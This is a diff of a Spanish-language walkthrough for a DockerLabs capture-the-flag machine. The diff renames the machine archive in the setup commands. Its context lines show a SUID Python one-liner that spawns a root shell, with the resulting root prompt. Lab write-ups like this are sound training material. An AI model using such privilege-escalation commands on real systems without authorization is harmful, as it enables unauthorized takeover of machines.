@@ -12,13 +12,13 @@ icon: linux
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
 ```bash
-unzip profetas.zip
+unzip strongjenkins.zip
 ```
 
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
-sudo bash auto_deploy.sh profetas.tar
+sudo bash auto_deploy.sh strongjenkins.tar
 ```
 
 Info:
@@ -208,6 +208,7 @@ Observamos que el binario `/usr/bin/python3.10` tiene permisos `SUID`. Podemos a
 python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
 
+Info:
 ```
 # whoami
 root
